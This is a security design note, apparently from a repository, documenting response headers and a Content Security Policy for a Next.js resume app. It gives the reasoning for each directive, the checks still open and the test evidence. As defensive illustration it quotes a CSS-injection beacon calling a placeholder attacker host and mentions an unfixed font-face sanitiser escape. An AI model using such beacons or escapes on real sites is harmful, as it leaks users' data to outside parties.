# Security response headers

Closes Phase 30 security-review finding **M3 — No security response headers**.

Before this change the application sent none: no CSP, no `frame-ancestors`, no
HSTS, no `Referrer-Policy`, no `X-Content-Type-Options`. There was no
`vercel.json` and no `headers()` in `next.config.js`.

## Where they are defined

`next.config.js`, in `headers()`, `source: "/:path*"` — every route, pages and
API handlers alike. Deliberately **not** in `src/middleware.ts`: that matcher
excludes `/api`, `/_next` and `/monitoring`, which are exactly the paths that
must not be left uncovered.

The values are compiled into `.next/routes-manifest.json` at build time, so a
change here requires a rebuild.

## The header set

| Header | Value | Reasoning |
| --- | --- | --- |
| `Content-Security-Policy-Report-Only` | see below | Report-only until the checklist below passes. |
| `X-Frame-Options` | `DENY` | Clickjacking defence for agents that predate `frame-ancestors`. |
| `X-Content-Type-Options` | `nosniff` | The API returns JSON and the DOCX route returns a binary; neither should ever be sniffed into something executable. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Resume and cover-letter URLs carry row ids. Cross-origin requests get the origin only. |
| `Permissions-Policy` | camera, microphone, geolocation, payment, usb, serial, … all `()` | The app needs none of them. Limits what an injected script can prompt the user for. |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains` | Two years, production only. |

### Why HSTS is production-only

Browsers apply HSTS to `https://localhost` as well. Because `local-ssl-proxy`
is a devDependency, a developer who once served the app over HTTPS locally would
have `localhost` pinned to HTTPS for two years, breaking plain-`http` local
development. The header is therefore emitted only when
`NODE_ENV === "production"`.

### Why `preload` is omitted

`preload` commits the apex domain **and every subdomain** to HTTPS-only inside
shipped browser binaries, and removal takes months. It should be added — and the
domain submitted to `hstspreload.org` — only once the owner confirms that no
subdomain of the production apex needs to answer plain HTTP. `includeSubDomains`
already gives the protection that matters for this app.

## The CSP, directive by directive

```
default-src 'self'
base-uri 'none'
object-src 'none'
frame-ancestors 'none'
form-action 'self'
script-src 'self' 'unsafe-inline' 'wasm-unsafe-eval' blob:      (+ 'unsafe-eval' in dev)
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com
font-src 'self' data: https://fonts.gstatic.com
img-src 'self' data: blob: https://lh3.googleusercontent.com
connect-src 'self' <supabase origin> https://o4510522193412096.ingest.de.sentry.io https://staticimgly.com
worker-src 'self' blob:
child-src 'self' blob:
frame-src 'self' blob:
```

Every allowance is traceable to code:

- **`style-src 'unsafe-inline'`** — the five resume templates render
  `style="..."` attributes during SSR. Removing it breaks all of them. Note that
  this means the policy does **not** stop the M1 CSS injection itself.
- **`https://fonts.googleapis.com` / `https://fonts.gstatic.com`** — the font
  picker's stylesheet `<link>` in `src/app/layout.tsx` and the font files it
  pulls. `next/font` self-hosts Inter and needs neither.
- **`img-src data:`** — the profile photo is persisted as a base64 data URL in
  the resume layout settings, not in Supabase Storage (the app uses no storage
  bucket).
- **`img-src blob:`** — background-removal output, and html2canvas during the
  cover-letter PDF export.
- **`img-src https://lh3.googleusercontent.com`** — `profiles.avatar_url` is
  populated from Google's `raw_user_meta_data` by the signup trigger in
  `supabase/migrations/006_rls_schema_hardening.sql` and rendered by
  `src/components/dashboard/user-menu.tsx`.
- **`'wasm-unsafe-eval'`, `worker-src blob:`** — onnxruntime-web behind
  `@imgly/background-removal` (`src/lib/image/remove-background.ts`).
- **`connect-src https://staticimgly.com`** — the same library fetches its ONNX
  model chunks from that CDN at runtime.
- **`connect-src` Sentry ingest host** — the browser SDK. The DSN itself lives
  in `src/instrumentation-client.ts`; a `next.config.js` cannot import that
  module, so the host is repeated in the config. **Change both together.**
- **`frame-src 'self' blob:`** — html2canvas clones the document into an iframe
  during PDF export, and jsPDF hands back a `blob:` URL.
- **`form-action 'self'`** — Supabase OAuth leaves by navigation, not by form
  submission, so `'self'` does not break sign-in.

### What the CSP buys, and what it does not

It does **not** stop the M1 sanitiser escape (CSS injection through the
deprecated `font face` attribute), because `style-src` must keep
`'unsafe-inline'` for the templates.

It does stop the **consequence**: the beacon. A CSS-injected
`background-image: url(https://attacker/…)` is an `img-src` fetch and an
injected `@font-face { src: url(…) }` is a `font-src` fetch, and neither origin
is allowed. `frame-ancestors 'none'` closes the overlay-in-an-iframe variant.
That is the downgrade the review asked for — once the policy is **enforcing**.

### Optional report collector

Set `CSP_REPORT_URI` at build time to add a `report-uri` directive. Without it,
report-only mode is only observable in a browser console, which is how the
evidence below was gathered.

## Before moving from report-only to enforced

1. **`script-src` still carries `'unsafe-inline'`.** Next's App Router streams
   the RSC payload through inline `<script>self.__next_f.push(...)</script>`
   tags with no nonce. Removing `'unsafe-inline'` requires a nonce minted in
   `src/middleware.ts` and threaded through — a separate change. Enforcing
   without it is still a net win, because the directives that block the beacon
   do not depend on it.
2. **The print path.** `window.print()` on all five templates.
3. **The cover-letter PDF export** (html2pdf.js → html2canvas + jsPDF).
4. **Profile-photo background removal** — confirm no violation asks for
   `'unsafe-eval'` in a production build, only `'wasm-unsafe-eval'`.
5. **Google OAuth sign-in**, then the dashboard user menu, for the
   `lh3.googleusercontent.com` avatar.
6. Add `upgrade-insecure-requests`, which is ignored in report-only mode.

Items 2 and 5 are not yet covered by an automated test; items 3 and 4 are not
either. `e2e/security-headers.spec.ts` covers items 2's rendering surface via
`emulateMedia({ media: 'print' })` but does not drive the real print dialog.

## Evidence

`e2e/security-headers.spec.ts` — three tests, all green:

1. A page route carries the full set, with the exact values and the required CSP
   directives asserted as substrings.
2. An API route carries it too.
3. The resume editor and preview, authenticated against a seeded fixture
   resume, fire **zero** `securitypolicyviolation` events, print media
   included. Violations are accumulated on the Node side via `exposeFunction`,
   because an `addInitScript` store is discarded on every navigation.

This is an E2E test and not a unit test on purpose: asserting the strings
`next.config.js` returns would prove nothing about what a browser receives.

## Follow-ups not taken here

- `Cross-Origin-Opener-Policy` / `Cross-Origin-Embedder-Policy` — out of scope
  for M3, and COEP in particular needs the CDN fetch above checked first.
- A nonce-based `script-src` (item 1).
